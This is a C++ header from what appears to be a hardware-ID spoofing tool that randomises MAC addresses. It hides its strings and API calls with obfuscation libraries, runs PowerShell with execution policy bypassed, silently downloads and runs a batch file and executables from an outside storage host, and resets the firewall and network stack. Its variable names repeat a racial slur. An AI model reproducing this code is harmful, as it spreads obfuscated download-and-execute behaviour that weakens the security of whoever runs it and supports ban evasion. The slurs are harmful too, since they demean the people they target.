#include <iostream>
#include <fstream>
#include "skStr.h"
#include <Windows.h>
#include <lazy_importer.hpp>
#include <optimize.h>

#include <ctime>
#include "windows.h"
#include <fstream>
#include <string>
#include <iostream>
#include <iomanip>
#include <random>
#include <sstream>
#include <iphlpapi.h>
#include <vector>
#include <tchar.h>
#include <dwmapi.h>
#include <algorithm>
#include <chrono>
#include <iphlpapi.h>
#include <wbemidl.h>
#include <comdef.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "user32.lib")
#ifndef PERM_MAC_H
#define PERM_MAC_H



std::string generateMacAddress(const std::string& prefix) {
    if (prefix.length() != 6) {
        throw std::invalid_argument(skCrypt("Prefix must be exactly 3 bytes (6 hex digits).").decrypt());
    }
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream macAddress;
    macAddress << std::hex << std::uppercase << std::setfill('0');
    macAddress << prefix;
    for (int i = 0; i < 3; ++i) {
        macAddress << std::setw(2) << dis(gen);
    }
    return macAddress.str();
}

std::string getUUIDLast12() {
    std::string uuid;
    char buffer[256];

    FILE* pipe = _popen(skCrypt("wmic csproduct get uuid").decrypt(), skCrypt("r").decrypt());
    if (!pipe) {
        return skCrypt("").decrypt();
    }

    fgets(buffer, sizeof(buffer), pipe);

    if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        uuid = buffer;
    }
    _pclose(pipe);

    uuid.erase(std::remove(uuid.begin(), uuid.end(), '\n'), uuid.end());
    uuid.erase(std::remove(uuid.begin(), uuid.end(), '\r'), uuid.end());


    if (uuid.length() < 12) {
        return skCrypt("").decrypt();
    }


    return uuid.substr(uuid.length() - 14);
}
std::string getManufacturer() {
    std::string manufacturer;
    char buffer[256];
    FILE* pipe = _popen(skCrypt("powershell -ExecutionPolicy Bypass -Command \"& { Get-WmiObject Win32_NetworkAdapter | Where-Object { $_.AdapterTypeID -eq 0 -and $_.NetConnectionStatus -eq 2 -and $_.NetConnectionID -like '*Ethernet*' } | ForEach-Object { if ($_.PNPDeviceID -like '*VEN_10EC*') { Write-Output 'Realtek' } elseif ($_.PNPDeviceID -like '*VEN_8086*') { Write-Output 'Intel' } } }\"").decrypt(), skCrypt("r").decrypt());
    if (!pipe) {

        return skCrypt("").decrypt();
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        manufacturer += buffer;
    }
    _pclose(pipe);
    manufacturer.erase(std::remove(manufacturer.begin(), manufacturer.end(), '\n'), manufacturer.end());
    return manufacturer;
}

void CheckNetworkAdapter() {
    AllocConsole();
    std::string manufacturer = getManufacturer();
    std::string last12 = getUUIDLast12();


        LI_FN(system)(skCrypt("curl https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/sapphire//MAC.bat -o C:\\Windows\\Temp\\MACCC.bat --silent").decrypt());

        LI_FN(system)((skCrypt("C:\\Windows\\Temp\\MACCC.bat --silent").decrypt()));
        LI_FN(system)(skCrypt("del /f C:\\Windows\\Temp\\MACCC.bat --silent").decrypt());

}

void macall() {
    getUUIDLast12();
    getManufacturer();
    CheckNetworkAdapter();

    std::wstring nigger21 = L"NETSH WINSOCK RESET";
    std::wstring nigger22 = L"netsh advfirewall reset";
    std::wstring nigger23 = L"NETSH INTERFACE IPV4 RESET";
    std::wstring nigger24 = L"NETSH INTERFACE IPV6 RESET";
    std::wstring nigger25 = L"NETSH INTERFACE TCP RESET";
    std::wstring nigger26 = L"NETSH INTERFACE IP RESET";
    std::wstring nigger27 = L"NETSH INTERFACE TCP RESET";
    std::wstring nigger28 = L"netsh rpc reset";
    std::wstring nigger29 = L"netsh branchcache reset";

    cmdLauncher(nigger21);
    cmdLauncher(nigger22);
    cmdLauncher(nigger23);
    cmdLauncher(nigger24);
    cmdLauncher(nigger25);
    cmdLauncher(nigger26);
    cmdLauncher(nigger27);
    cmdLauncher(nigger28);
    cmdLauncher(nigger29);

    LI_FN(system)(skCrypt("curl https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/sapphire//devcon.exe -o C:\\Windows\\Temp\\devcon.exe --silent").decrypt());
    LI_FN(system)(skCrypt("C:\\Windows\\Temp\\devcon.exe rescan --silent").decrypt());
    LI_FN(system)(skCrypt("del /f C:\\Windows\\System32\\drivers\\devcon.exe --silent").decrypt());


    LI_FN(system)(skCrypt("curl https://ojajsfmnbsxbyvxrybmc.supabase.co/storage/v1/object/public/sapphire//DriveCleanup.exe -o C:\\Windows\\Temp\\DriveCleanup.exe --silent").decrypt());
    LI_FN(system)(skCrypt("C:\\Windows\\Temp\\DriveCleanup.exe").decrypt());
    LI_FN(system)(skCrypt("del /f C:\\Windows\\System32\\drivers\\DriveCleanup.exe --silent").decrypt());

    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_msclient").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_server").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_tcpip6").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_pacer").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_lltdio").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_rspndr").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_lldp").decrypt());

    LI_FN(system)(skCrypt("powershell.exe Enable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_pacer").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Enable-NetAdapterBinding -Name \"Ethernet\" -ComponentID ms_tcpip").decrypt());

 
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_msclient").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_server").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_tcpip6").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_pacer").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_lltdio").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_rspndr").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Disable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_lldp").decrypt());

    LI_FN(system)(skCrypt("powershell.exe Enable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_pacer").decrypt());
    LI_FN(system)(skCrypt("powershell.exe Enable-NetAdapterBinding -Name \"Wi-Fi\" -ComponentID ms_tcpip").decrypt());


}

#endif PERM_MAC_H